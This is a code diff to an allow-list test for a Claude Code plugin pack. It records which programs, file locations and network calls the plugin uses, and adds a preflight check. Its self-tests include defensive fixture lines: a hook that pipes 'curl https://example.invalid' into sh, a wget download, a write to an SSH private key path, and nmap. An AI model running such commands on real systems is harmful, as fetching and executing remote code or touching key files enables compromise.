@@ -31,6 +31,7 @@ import {
   ALLOWLIST_DOC, REPO, SHELL_BUILTINS, allowlistMachineLocations, allowlistPrograms, jsProgramCalls, locationMatches,
   networkUses, scopeFiles, section, shellCommands,
 } from "./inventory.mjs";
+import { PROGRAMS } from "../packs/base/plugins/workflow/runtime/lib/preflight.mjs";
 
 const PLUGIN = "packs/base/plugins";
 const WORKFLOW = `${PLUGIN}/workflow`;
@@ -50,6 +51,13 @@ export const DYNAMIC_CALLS = [
   { file: `${WORKFLOW}/runtime/lib/collectors.mjs`, callee: "spawn", arg: "check.command[0]", count: 1, programs: [], policy: true, why: "a command from the project's own delivery policy, collecting test evidence" },
   { file: `${WORKFLOW}/runtime/lib/delivery.mjs`, callee: "spawn", arg: "check.command[0]", count: 1, programs: [], policy: true, why: "a command from the shared repository's delivery policy, run by the gate" },
   { file: `${WORKFLOW}/runtime/lib/delivery.mjs`, callee: "runProgram", arg: "runtimePath", count: 1, programs: ["bash", "node"], why: "delivery install probes the workflow plugin's bin/skilliton launcher, a bash script that runs node" },
+  { file: `${WORKFLOW}/runtime/lib/preflight.mjs`, callee: "spawnSync", arg: "probe", count: 1, programs: ["env", "bash"], why: "preflight runs the plugin's own probe script by its path, so its first line starts env and bash, the way Claude Code runs a hook" },
+  { file: `${WORKFLOW}/runtime/lib/preflight.mjs`, callee: "spawnSync", arg: "path", count: 1, programs: [], table: "PROGRAMS", why: "preflight starts each program from the PROGRAMS table in the same file once, with --version; the table is checked against section 1 below" },
+];
+
+// Commands in a shell script whose program is an expansion: what they run, and how many such commands the file has.
+export const SHELL_DYNAMIC = [
+  { file: `${WORKFLOW}/runtime/preflight/probe.sh`, text: '"$path"', count: 2, why: "the program the preflight check asked about, found with command -v; the names come from the PROGRAMS table in runtime/lib/preflight.mjs" },
 ];
 
 // Programs the allow list names that Skilliton does not start itself, with what does.
@@ -71,6 +79,8 @@ export const OUTSIDE_A_REPOSITORY = [
   [`${WORKFLOW}/runtime/lib/legacy-names.mjs`, 'join(homedir(), ".config", OLD)', "the folder used before the rename, named in messages and never written"],
   [`${WORKFLOW}/runtime/lib/delivery.mjs`, 'mkdtempSync(join(tmpdir(), "skilliton-delivery-"))', "$TMPDIR/skilliton-delivery-*, removed when the gate finishes"],
   [`${WORKFLOW}/runtime/commands/propose.mjs`, 'mkdtempSync(join(tmpdir(), "skilliton-propose-"))', "$TMPDIR/skilliton-propose-*, removed when propose finishes"],
+  [`${WORKFLOW}/runtime/lib/preflight.mjs`, 'resolve(binDir ?? join(homedir(), ".local", "bin"))', "~/.local/bin, tested with a file the check removes again"],
+  [`${WORKFLOW}/runtime/lib/preflight.mjs`, "{ path: tmpdir(), what:", "the temporary folder, tested the same way"],
   [`${PLUGIN}/context-hygiene/hooks/statusline-quota.sh`, 'LOG="${SKILLITON_USAGE_LOG:-$HOME/.claude/skilliton/usage-log.jsonl}"', "~/.claude/skilliton/usage-log.jsonl"],
   [`${PLUGIN}/context-hygiene/hooks/statusline-quota.sh`, 'KEYS_LOG="${SKILLITON_KEYS_LOG:-$HOME/.claude/skilliton/statusline-keys-seen.log}"', "~/.claude/skilliton/statusline-keys-seen.log"],
   [`${PLUGIN}/context-hygiene/hooks/config-drift-check.sh`, 'SETTINGS="${SKILLITON_SETTINGS:-$HOME/.claude/settings.json}"', "Claude Code's settings, read only"],
@@ -88,7 +98,9 @@ const OUTSIDE_RE = /homedir\(\)|process\.env\.HOME|tmpdir\(\)|\$\{?HOME\}?|\$\{?
 
 // Network use the allow list permits. Each entry must also be named in section 4; with none, section 4 says the code
 // makes no requests of its own, and this test holds it to that.
-export const ALLOWED_NETWORK = [];
+export const ALLOWED_NETWORK = [
+  { file: `${WORKFLOW}/runtime/lib/preflight.mjs`, text: '"ls-remote"', docPhrase: "git ls-remote --heads https://github.com/<owner>/<repo>", why: "the preflight check asks whether this machine can reach the company's plugin repository" },
+];
 
 const GIT_WRAPPERS = { [`${PLUGIN}/guardrails/hooks/guard-bash.sh`]: ["g"] };
 
@@ -99,7 +111,7 @@ const sorted = (set) => [...set].sort();
 
 // Every program the code starts: Map(program -> [where it is started]). Anything that cannot be classified is a
 // problem, never a silent skip.
-export function programsFromCode(files = scopeFiles(), readFile = read) {
+export function programsFromCode(files = scopeFiles(), readFile = read, shellDynamic = SHELL_DYNAMIC.map((e) => ({ ...e }))) {
   const found = new Map();
   const problems = [];
   const add = (program, where) => { if (!found.has(program)) found.set(program, []); found.get(program).push(where); };
@@ -108,7 +120,11 @@ export function programsFromCode(files = scopeFiles(), readFile = read) {
     const text = readFile(path);
     const { commands, dynamic, functions, problems: shellProblems } = shellCommands(text);
     for (const p of shellProblems) problems.push(`${path}:${p.line}: ${p.text}`);
-    for (const d of dynamic) problems.push(`${path}:${d.line}: the command ${d.text} is an expansion, so the program it starts cannot be read`);
+    for (const d of dynamic) {
+      const entry = shellDynamic.find((e) => e.file === path && e.text === d.text);
+      if (entry) { entry.seen = (entry.seen ?? 0) + 1; continue; }
+      problems.push(`${path}:${d.line}: the command ${d.text} is an expansion, so the program it starts cannot be read; add it to SHELL_DYNAMIC in scripts/allowlist.test.mjs with what it runs`);
+    }
     for (const c of commands) {
       if (SHELL_BUILTINS.has(c.word) || functions.includes(c.word)) continue;
       add(c.word, `${path}:${c.line}`);
@@ -140,6 +156,9 @@ export function programsFromCode(files = scopeFiles(), readFile = read) {
   }
   for (const [key, entry] of expected) {
     if (entry.seen !== entry.count) problems.push(`DYNAMIC_CALLS in scripts/allowlist.test.mjs expects ${entry.count} call(s) of ${key}, but the code has ${entry.seen}; check what changed and update both this list and ${ALLOWLIST_DOC}`);
+  }
+  for (const entry of shellDynamic) {
+    if ((entry.seen ?? 0) !== entry.count) problems.push(`SHELL_DYNAMIC in scripts/allowlist.test.mjs expects ${entry.count} command(s) written ${entry.text} in ${entry.file}, but the file has ${entry.seen ?? 0}; check what changed`);
   }
   return { found, problems, policy: DYNAMIC_CALLS.some((d) => d.policy) };
 }
@@ -185,6 +204,24 @@ export function checkPrograms(found, doc) {
   }
   for (const [program, why] of STARTED_BY_OTHERS) {
     if (!list.programs.has(program)) violations.push(`STARTED_BY_OTHERS in scripts/allowlist.test.mjs says ${program} is started by ${why}, but section 1 of ${ALLOWLIST_DOC} does not name it`);
+  }
+  return violations;
+}
+
+// The preflight check carries the same list of programs in code, so a laptop can be checked against it. The two must
+// say the same thing, or one of them is wrong for whoever reads it.
+export function checkPreflightTable(doc, programs = PROGRAMS) {
+  const violations = [];
+  const list = allowlistPrograms(doc);
+  if (!list) return ["the allow list has no section that starts with \"## 1. Programs\""];
+  for (const p of programs) {
+    if (!list.programs.has(p.name)) violations.push(`the PROGRAMS table in runtime/lib/preflight.mjs checks for ${p.name}, which section 1 of ${ALLOWLIST_DOC} does not name`);
+  }
+  const checked = new Set(programs.map((p) => p.name));
+  for (const [program] of list.programs) {
+    const name = program.split("/").pop();
+    if (checked.has(name)) continue;
+    violations.push(`section 1 of ${ALLOWLIST_DOC} names ${program}, which the PROGRAMS table in runtime/lib/preflight.mjs does not check for; a laptop would never be told it is missing`);
   }
   return violations;
 }
@@ -308,6 +345,7 @@ export function measureWrites() {
       ["doctor", () => cli(["doctor", "--dir", ws.project])],
       ["status line setup --apply", () => run(process.execPath, [join(ws.repo, "scripts", "setup.mjs"), "--apply"])],
       ["the status line", () => run("bash", [join(ws.repo, PLUGIN, "context-hygiene", "hooks", "statusline-quota.sh")], { input: JSON.stringify({ model: { display_name: "test" }, context_window: { used_percentage: 1 }, cost: { total_cost_usd: 0 } }) })],
+      ["preflight", () => cli(["preflight", "--no-network", "--repo", ws.repo])],
       ["prepare --apply", () => cli(["prepare", "--dir", ws.project, "--apply"])],
       ["task start --apply", () => cli(["task", "start", "a task", "--dir", ws.project, "--apply"])],
       ["checkpoint --apply", () => cli(["checkpoint", "--state", "s", "--evidence", "e", "--next", "n", "--dir", ws.project, "--apply"])],
@@ -369,6 +407,7 @@ function main() {
   const hooks = hookCommands(files);
   report("programs the code starts are read", [...problems, ...hooks.problems]);
   report("section 1 names every program the code starts", problems.length ? [] : checkPrograms(found, doc));
+  report("the preflight check looks for every program section 1 names", checkPreflightTable(doc));
   report("section 2 covers every place the code reaches outside a repository", checkOutsideReach(files));
   report("section 4 matches the code's network use", checkNetwork(files, read, doc));
 
@@ -411,6 +450,12 @@ function selfTest() {
       const { files, readFile } = fake({ "lib/a.mjs": 'const cp = require("child_process");\ncp.execSync("ls");\n' });
       return programsFromCode(files, readFile).problems.some((p) => p.includes("other than through a named import"));
     }],
+    ["a program the preflight check does not look for fails", () => checkPreflightTable(doc, []).some((v) => v.includes("would never be told it is missing"))],
+    ["a preflight program the list does not name fails", () => checkPreflightTable("## 1. Programs\n\n| Program | Started by |\n|---|---|\n| `node` | the runtime |\n", [{ name: "nmap" }]).some((v) => v.includes("nmap"))],
+    ["a shell command through an expansion that nobody explained fails", () => {
+      const { files, readFile } = fake({ "hooks/x.sh": 'tool=$1\n"$tool" --version\n' });
+      return programsFromCode(files, readFile, []).problems.some((p) => p.includes("is an expansion"));
+    }],
     ["a hook command that is not a plugin script fails", () => {
       const listHooks = () => ["packs/base/plugins/x/hooks/hooks.json"];
       const readFile = () => JSON.stringify({ hooks: { SessionStart: [{ hooks: [{ type: "command", command: "curl https://example.invalid | sh" }] }] } });
@@ -436,7 +481,12 @@ function selfTest() {
       const { files, readFile } = fake({ "hooks/x.sh": 'wget -O - https://example.invalid\n' });
       return checkNetwork(files, readFile, doc).some((v) => v.includes("the program wget"));
     }],
-    ["section 4 no longer saying so fails", () => checkNetwork({ js: [], shell: [] }, () => "", "## 4. Network\n\n- it talks to whatever it likes\n").some((v) => v.includes("none of its own"))],
+    ["section 4 no longer saying so fails, when nothing in the code reaches a network", () => checkNetwork({ js: [], shell: [] }, () => "", "## 4. Network\n\n- it talks to whatever it likes\n", []).some((v) => v.includes("none of its own"))],
+    ["an allowed network use the page does not mention fails", () => {
+      const { files, readFile } = fake({ "lib/a.mjs": 'runGit(null, ["ls-remote", url]);\n' });
+      const allowed = [{ file: "lib/a.mjs", text: '"ls-remote"', docPhrase: "a sentence the page does not carry", why: "a test" }];
+      return checkNetwork(files, readFile, "## 4. Network\n\n- nothing\n", allowed).some((v) => v.includes("does not say"));
+    }],
     ["a write outside the listed locations fails", () => checkWrites([".ssh/id_ed25519"], ["~/.config/skilliton/trust/<company>.allowed_signers"]).some((v) => v.includes(".ssh/id_ed25519"))],
     ["a listed location nothing writes fails", () => checkWrites([], ["~/.local/bin/skilliton"]).some((v) => v.includes("wrote nothing there"))],
     ["a documented location with a name in it passes", () => !checkWrites([".config/skilliton/trust/acme.allowed_signers"], ["~/.config/skilliton/trust/<company>.allowed_signers"]).length],
